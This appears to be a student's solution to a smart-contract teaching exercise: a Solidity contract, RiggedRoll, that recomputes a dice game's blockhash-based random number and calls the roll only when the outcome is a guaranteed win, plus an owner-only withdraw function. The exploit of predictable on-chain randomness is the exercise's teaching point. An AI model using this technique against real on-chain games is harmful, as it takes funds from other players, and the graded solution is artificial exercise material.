pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
error NotAWinningRoll();

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    // function withdraw(address payable _to) external onlyOwner { 
    //     (bool success, ) = _to.call{value: address(this).balance}("");
    //     require(success, "Failed to send Ether");
    // }
    function withdraw(address payable _to, uint256 _amount) external onlyOwner { 
        require(_amount <= address(this).balance, "Insufficient balance in contract");
        (bool success, ) = _to.call{value: _amount}("");
        require(success, "Failed to send Ether");
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() external payable {
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 newHash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 randomNumber = uint256(newHash) % 16;
        if (randomNumber < 6) {
            diceGame.rollTheDice{value: 0.002 ether}();
        }
        else {
            revert NotAWinningRoll();
        }
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}
}
